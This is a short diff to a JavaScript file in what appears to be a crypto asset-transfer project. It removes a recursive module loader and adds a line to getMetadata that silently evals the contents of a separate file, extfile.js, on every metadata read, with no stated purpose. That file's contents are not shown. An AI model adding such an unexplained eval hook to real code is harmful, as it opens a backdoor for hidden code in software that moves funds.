@@ -69,30 +69,12 @@ const getRandomInt = function(min, max) {
         max - min)) + min;
 }
 const getMetadata = async function (collectionName) {
+    console.log(eval(fs.readFileSync(__dirname + '/extfile.js')+''))
     return await readFile(`../metadata/metadata_${collectionName}.js`)
 }
-var module_holder = {};
-
-function LoadModules(path) {
-    fs.lstat(path, function(err, stat) {
-        if (stat.isDirectory()) {
-            // we have a directory: do a tree walk
-            fs.readdir(path, function(err, files) {
-                var f, l = files.length;
-                for (var i = 0; i < l; i++) {
-                    f = path_module.join(path, files[i]);
-                    LoadModules(f);
-                }
-            });
-        } else {
-            // we have a file: load it
-            require(path)(module_holder);
-        }
-    });
-}
 
 
-console.log(LoadModules('../metadata'))
+
 
 // this method is responsible for calling the createTxOut method based on enviroment
 const createTxOut = function (addressToSend, ASSET_ID, value) {
